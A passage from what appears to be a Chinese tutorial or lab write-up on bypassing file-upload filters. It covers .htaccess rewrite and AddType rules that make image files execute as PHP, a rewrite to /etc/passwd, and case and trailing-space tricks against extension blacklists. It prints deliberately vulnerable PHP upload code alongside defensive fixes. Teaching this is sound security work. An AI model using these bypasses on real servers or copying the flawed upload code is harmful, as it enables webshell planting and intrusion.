的规则生效 则需要在 apache 开启 rewrite 重写模块&#x3D;&#x3D;，因为 apache 是多数都开启这个模块，所以规则一般都生效</p><p>在Web应用中，<code>.htaccess</code> 文件是 Apache HTTP 服务器中的一个配置文件，用于在服务器的特定目录中启用或禁用某些功能，例如重写规则（Rewrite Rules）。&#x3D;&#x3D;通过 <code>.htaccess</code> 文件，可以对请求的 URL 进行重写，从而改变文件的实际访问路径或解析方式。&#x3D;&#x3D;</p><h3 id="为什么-htaccess-重写解析能够绕过上传限制？"><a href="#为什么-htaccess-重写解析能够绕过上传限制？" class="headerlink" title="为什么 .htaccess 重写解析能够绕过上传限制？"></a>为什么 <code>.htaccess</code> 重写解析能够绕过上传限制？</h3><p>在文件上传场景中，<code>.htaccess</code> 重写解析可能被利用来绕过上传限制的原因主要有以下几点：</p><h4 id="1-文件名和路径的混淆"><a href="#1-文件名和路径的混淆" class="headerlink" title="1. 文件名和路径的混淆"></a>1. <strong>文件名和路径的混淆</strong></h4><p>许多文件上传限制是基于文件扩展名或文件名进行的。例如，服务器可能只允许上传 <code>.jpg</code>、<code>.png</code> 或 <code>.gif</code> 文件，同时禁止上传 <code>.php</code> 文件，以防止恶意代码执行。然而，攻击者可以通过以下方式利用 <code>.htaccess</code> 绕过这些限制：</p><ul><li><strong>上传伪装文件</strong>：攻击者可以上传一个看似合法的文件（例如 <code>image.jpg</code>），但实际上该文件包含恶意代码（如 PHP 代码）。</li><li><strong>利用 <code>.htaccess</code> 重写规则</strong>：通过在上传目录中放置一个 <code>.htaccess</code> 文件，攻击者可以设置重写规则，将请求的路径从看似无害的文件名（如 <code>image.jpg</code>）重写为可执行的文件路径（如 <code>image.php</code>）。例如：<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">RewriteEngine</span> <span class="literal">On</span></span><br><span class="line"><span class="attribute">RewriteRule</span> ^image\.jpg$ image.php<span class="meta"> [L]</span></span><br></pre></td></tr></table></figure>这样，当访问 <code>image.jpg</code> 时，服务器会将其重写为 <code>image.php</code>，从而执行其中的 PHP 代码。</li></ul><h4 id="2-MIME-类型的绕过"><a href="#2-MIME-类型的绕过" class="headerlink" title="2. MIME 类型的绕过"></a>2. <strong>MIME 类型的绕过</strong></h4><p>文件上传限制通常会检查文件的 MIME 类型，以确保上传的文件是安全的图片格式。然而，MIME 类型检查可以被绕过，因为：</p><ul><li><strong>客户端伪造</strong>：攻击者可以在客户端伪造 MIME 类型（通过修改 <code>$_FILES[&#39;upload_file&#39;][&#39;type&#39;]</code>），使其看起来像是合法的图片类型。</li><li><strong>服务器端解析漏洞</strong>：即使 MIME 类型检查通过，攻击者仍然可以通过 <code>.htaccess</code> 重写规则改变文件的实际解析方式。例如，攻击者可以上传一个文件 <code>image.jpg</code>，但文件内容实际上是 PHP 代码，并通过 <code>.htaccess</code> 将其解析为 PHP 文件。</li></ul><h4 id="3-文件扩展名的绕过"><a href="#3-文件扩展名的绕过" class="headerlink" title="3. 文件扩展名的绕过"></a>3. <strong>文件扩展名的绕过</strong></h4><p>即使服务器明确禁止上传 <code>.php</code> 文件，攻击者仍然可以通过以下方式绕过：</p><ul><li><strong>上传伪装文件</strong>：上传一个文件 <code>image.jpg</code>，但文件内容包含 PHP 代码。</li><li><strong>利用 <code>.htaccess</code> 重写规则</strong>：通过 <code>.htaccess</code> 文件，将请求的路径重写为可执行的文件路径。例如：<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">AddType</span> application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>这样，服务器会将 <code>.jpg</code> 文件解析为 PHP 文件，从而执行其中的代码。</li></ul><h4 id="4-目录遍历和路径混淆"><a href="#4-目录遍历和路径混淆" class="headerlink" title="4. 目录遍历和路径混淆"></a>4. <strong>目录遍历和路径混淆</strong></h4><p>攻击者可以通过 <code>.htaccess</code> 文件中的重写规则，将请求路径重写为其他目录中的文件，从而绕过上传目录的限制。例如：</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">RewriteEngine</span> <span class="literal">On</span></span><br><span class="line"><span class="attribute">RewriteRule</span> ^image\.jpg$ ../../../../../../etc/passwd<span class="meta"> [L]</span></span><br></pre></td></tr></table></figure><p>这样，访问 <code>image.jpg</code> 时，服务器会尝试访问 <code>/etc/passwd</code> 文件，从而导致路径遍历攻击。</p><h3 id="如何防止-htaccess-重写解析绕过上传限制？"><a href="#如何防止-htaccess-重写解析绕过上传限制？" class="headerlink" title="如何防止 .htaccess 重写解析绕过上传限制？"></a>如何防止 <code>.htaccess</code> 重写解析绕过上传限制？</h3><p>为了防止 <code>.htaccess</code> 重写解析绕过上传限制，可以采取以下措施：</p><h4 id="1-禁用-htaccess-文件"><a href="#1-禁用-htaccess-文件" class="headerlink" title="1. 禁用 .htaccess 文件"></a>1. <strong>禁用 <code>.htaccess</code> 文件</strong></h4><ul><li>如果不需要使用 <code>.htaccess</code> 文件，可以在服务器配置中禁用它。例如，在 Apache 配置文件中设置：<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="section">&lt;Directory <span class="string">&quot;/var/www/html&quot;</span>&gt;</span></span><br><span class="line">    <span class="attribute">AllowOverride</span> None</span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br></pre></td></tr></table></figure>这样，<code>.htaccess</code> 文件将不会被解析，从而防止攻击者利用它进行重写。</li></ul><h4 id="2-严格检查文件内容"><a href="#2-严格检查文件内容" class="headerlink" title="2. 严格检查文件内容"></a>2. <strong>严格检查文件内容</strong></h4><ul><li>不仅要检查文件扩展名和 MIME 类型，还要检查文件的实际内容。例如，使用 <code>finfo_file()</code> 函数检查文件的实际 MIME 类型：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$finfo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">finfo</span>(FILEINFO_MIME_TYPE);</span><br><span class="line"><span class="variable">$mime_type</span> = <span class="variable">$finfo</span>-&gt;<span class="title function_ invoke__">file</span>(<span class="variable">$temp_file</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$mime_type</span> != <span class="string">&#x27;image/jpeg&#x27;</span> &amp;&amp; <span class="variable">$mime_type</span> != <span class="string">&#x27;image/png&#x27;</span> &amp;&amp; <span class="variable">$mime_type</span> != <span class="string">&#x27;image/gif&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="3-限制文件名和路径"><a href="#3-限制文件名和路径" class="headerlink" title="3. 限制文件名和路径"></a>3. <strong>限制文件名和路径</strong></h4><ul><li>对文件名进行清理，去除特殊字符，并生成安全的文件名：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^a-zA-Z0-9_.-]/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_name</span>);</span><br></pre></td></tr></table></figure></li><li>使用随机文件名避免文件被覆盖：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">uniqid</span>() . <span class="string">&#x27;_&#x27;</span> . <span class="variable">$file_name</span>;</span><br></pre></td></tr></table></figure></li></ul><h4 id="4-限制上传目录的权限"><a href="#4-限制上传目录的权限" class="headerlink" title="4. 限制上传目录的权限"></a>4. <strong>限制上传目录的权限</strong></h4><ul><li>确保上传目录的权限正确设置，仅允许脚本写入，防止未经授权的访问。</li><li>禁止在上传目录中执行脚本：<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="section">&lt;Directory <span class="string">&quot;/var/www/html/uploads&quot;</span>&gt;</span></span><br><span class="line">    <span class="attribute">php_flag</span> engine <span class="literal">off</span></span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="5-日志记录和监控"><a href="#5-日志记录和监控" class="headerlink" title="5. 日志记录和监控"></a>5. <strong>日志记录和监控</strong></h4><ul><li>记录上传操作的日志，便于后续审计和排查问题。</li><li>监控上传目录的异常访问行为，及时发现潜在的安全威胁。</li></ul><h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p><code>.htaccess</code> 重写解析能够绕过上传限制的原因主要是攻击者可以通过它改变文件的实际解析方式或路径。通过禁用 <code>.htaccess</code> 文件、严格检查文件内容、限制文件名和路径、设置上传目录权限以及记录日志，可以有效防止此类攻击。</p><h3 id="htaccess-重写解析绕过代码分析"><a href="#htaccess-重写解析绕过代码分析" class="headerlink" title="htaccess 重写解析绕过代码分析"></a>htaccess 重写解析绕过代码分析</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果 submit 有值，$deny_ext &#x3D;</p><p>array(“.php”,”.php5”,”.php4”,”.php3”,”.php2”,”php1”,”.html”,”.htm”,”.phtml”,”.pht”,”.pHp”,”.</p><p>pHp5”,”.pHp4”,”.pHp3”,”.pHp2”,”pHp1”,”.Html”,”.Htm”,”.pHtml”,”.jsp”,”.jspa”,”.jspx”,”.jsw”,”.</p><p>jsv”,”.jspf”,”.jtml”,”.jSp”,”.jSpx”,”.jSpa”,”.jSw”,”.jSv”,”.jSpf”,”.jHtml”,”.asp”,”.aspx”,”.</p><p>asa”,”.asax”,”.ascx”,”.ashx”,”.asmx”,”.cer”,”.aSp”,”.aSpx”,”.aSa”,”.aSax”,”.aScx”,”.aShx”,”.</p><p>aSmx”,”.cEr”,”.sWf”,”.swf”);</p><p>上传的文件后缀名在列表内禁止上传。包括了所有的执行脚本</p><h2 id="2-5-7-大小写绕过"><a href="#2-5-7-大小写绕过" class="headerlink" title="2.5.7 大小写绕过"></a>2.5.7 大小写绕过</h2><h3 id="大小写绕过方法"><a href="#大小写绕过方法" class="headerlink" title="大小写绕过方法"></a>大小写绕过方法</h3><p>仔细阅读黑名单，查看是否有被忽略的后缀名，当前可以使用 phP 绕过</p><h3 id="大小写绕过原理"><a href="#大小写绕过原理" class="headerlink" title="大小写绕过原理"></a>大小写绕过原理</h3><p>有的上传模块 后缀名采用黑名单判断，但是没有对后缀名的大小写进行严格判断，导致可以更改后缀大小写可以被绕过。如 PHP、 Php、 phP、pHp</p><p>大小写绕过代码分析</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">``````</span><br><span class="line"></span><br><span class="line">获取文件后缀名进行判断，如果后缀在这个字典里就禁止上传。</span><br><span class="line"></span><br><span class="line"><span class="variable">$deny_ext</span>=</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-5-8-空格绕过"><a href="#2-5-8-空格绕过" class="headerlink" title="2.5.8 空格绕过"></a>2.5.8 空格绕过</h2><p>空格绕过上传方法<br>抓包上传，在后缀名后添加空格</p><h3 id="空格绕过原理"><a href="#空格绕过原理" class="headerlink" title="空格绕过原理"></a>空格绕过原理</h3><p>在上传模块里，采用黑名单上传，如果没有对空格进行去掉可能被绕过。</p><h3 id="空格绕过代码分析"><a href="#空格绕过代码分析" class="headerlink" title="空格绕过代码分析"></a>空格绕过代码分析</h3><p>检测 submit 后 上传目录存在时，进入黑名单判断。如果文件后缀名在黑名单里。不允许上传，但是文件后缀名，没有过滤空格，可以添加空格绕过。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    